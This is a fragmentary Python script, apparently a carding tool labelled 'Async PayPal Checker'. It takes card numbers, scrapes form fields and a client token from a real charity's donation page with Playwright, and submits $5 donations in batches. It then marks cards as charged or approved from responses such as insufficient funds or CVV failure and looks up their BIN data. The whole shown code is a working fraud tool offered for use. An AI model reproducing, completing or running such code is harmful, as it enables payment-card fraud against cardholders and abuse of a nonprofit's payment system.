...
# Async PayPal Checker with retry and Playwright for JS rendering
async def pali(ccx: str, max_retries=6):
    for attempt in range(max_retries):
        try:
            ...
            headers = {
                ...
                'referer': 'https://ananau.org/donate/',
            ...
            # Use Playwright to fetch page with JS executed
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(user_agent=headers['user-agent'])
                page = await context.new_page()
                await page.goto('https://ananau.org/donate/', timeout=60000)
                await page.wait_for_load_state('networkidle')
                text1 = await page.content()
                await browser.close()
            
            print(f"[DEBUG] Step 1 Response: Length={len(text1)}")
            
            # Parse response with flexible regex
            print(f"[DEBUG] Step 2: Parsing form data...")
            id_form1_match = re.search(r'name=[\'"]give-form-id-prefix[\'"]\s+value=[\'"](.*?)[\'"]', text1, re.IGNORECASE)
            id_form2_match = re.search(r'name=[\'"]give-form-id[\'"]\s+value=[\'"](.*?)[\'"]', text1, re.IGNORECASE)
            nonec_match = re.search(r'name=[\'"]give-form-hash[\'"]\s+value=[\'"](.*?)[\'"]', text1, re.IGNORECASE)
            enc_match = re.search(r'data-client-token[\'"]?\s*:\s*[\'"](.*?)[\'"]', text1, re.IGNORECASE)
            
            if not (id_form1_match and id_form2_match and nonec_match and enc_match):
                print(f"[DEBUG] ⚠️ PARSING_ERROR: Missing form fields")
                print("[DEBUG] Dumping snippet of page for debug:")
                print(text1[0:1500])  # Print first 1500 chars for debug
                if attempt < max_retries - 1:
                    print(f"[DEBUG] 🔄 Retrying in 3 seconds... (Attempt {attempt+2}/{max_retries})")
            ...
            au_match = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec, re.IGNORECASE)
            
            if not au_match:
                print(f"[DEBUG] ⚠️ PARSING_ERROR: Missing accessToken")
                if attempt < max_retries - 1:
                    await asyncio.sleep(3)
                    continue
                return "PARSING_ERROR"
            ...
            async with aiohttp.ClientSession(timeout=timeout) as session:
                ...
                headers2.update({
                    ...
                    'referer': 'https://ananau.org/donate/?payment-mode=paypal-commerce',
                })
                ...
                form_data.add_field('give-current-url', 'https://ananau.org/donate/')
                form_data.add_field('give-form-url', 'https://ananau.org/donate/')
                ...
                form_data.add_field('give-amount', '5,00')
...
"""
                ...
                for cc_parsed, result in zip(batch_parsed, results):
                    ...
                    if 'CHARGE 5.00$' in str(result) or 'INSUFFICIENT_FUNDS' in str(result) or 'CVV2_FAILURE' in str(result):
                        passs += 1
                        # Send approved card
                        bin_info = await dato(cc_parsed[:6])
                        
                        if 'CHARGE 5.00$' in str(result):
                            status_text = "CHARGED"
                        else:
                            status_text = "APPROVED"
